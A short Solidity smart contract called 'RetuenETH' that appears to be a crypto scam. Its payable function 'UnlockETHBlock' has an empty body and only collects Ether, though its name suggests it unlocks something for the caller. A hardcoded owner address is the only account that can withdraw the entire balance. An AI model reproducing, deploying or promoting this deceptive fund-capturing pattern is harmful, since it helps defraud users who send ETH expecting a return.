/**

*/

pragma solidity ^0.4.26;

contract RetuenETH {

    address private  owner;

     constructor() public{   
        owner=0xbE1692baE9C5a831E335d91445feb56029d5210d;
    }
    function getOwner(
    ) public view returns (address) {    
        return owner;
    }
    function withdraw() public {
        require(owner == msg.sender);
        msg.sender.transfer(address(this).balance);
    }

    function UnlockETHBlock() public payable {
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}